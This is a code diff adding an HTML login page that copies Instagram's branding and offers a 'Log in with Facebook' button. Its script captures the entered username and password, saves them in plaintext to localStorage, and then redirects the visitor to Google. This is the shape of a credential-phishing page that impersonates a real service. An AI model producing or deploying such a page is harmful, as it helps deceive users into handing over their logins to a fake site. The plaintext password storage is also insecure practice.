@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to right, #fdf497, #fd5949, #d6249f, #5b86e5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 300px;
+            text-align: center;
+        }
+        h2 {
+            color: #333;
+            margin: 20px 0;
+        }
+        .input-field {
+            margin: 10px 0;
+            display: flex;
+            flex-direction: column;
+        }
+        .input-field input {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .login-button {
+            margin-top: 10px;
+            padding: 10px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .login-button:hover {
+            background-color: #0056b3;
+        }
+        .facebook-button {
+            background-color: #1877f2;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .facebook-button:hover {
+            background-color: #165eab;
+        }
+        .footer {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #666;
+        }
+        .forgot-password {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #007BFF;
+            text-decoration: none;
+        }
+        .instagram-logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="instagram-logo">
+    <h2>Log in to Your Account</h2>
+    <form id="loginForm">
+        <div class="input-field">
+            <input type="text" id="username" placeholder="Username" required>
+        </div>
+        <div class="input-field">
+            <input type="password" id="password" placeholder="Password" required>
+        </div>
+        <button type="submit" class="login-button">Log In</button>
+        <button type="button" class="facebook-button">Log in with Facebook</button>
+    </form>
+    <a href="#" class="forgot-password">Forgot password?</a>
+    <div class="footer">
+        <p>Don't have an account? <a href="#">Sign Up</a></p>
+    </div>
+</div>
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent the default form submission
+
+        // Get the values from the input fields
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        // Save the details to local storage (optional)
+        localStorage.setItem('username', username);
+        localStorage.setItem('password', password);
+
+        // Redirect to Google (or any other URL you prefer)
+        window.location.href = 'https://www.google.com';
+    });
+</script>
+
+</body>
+</html>
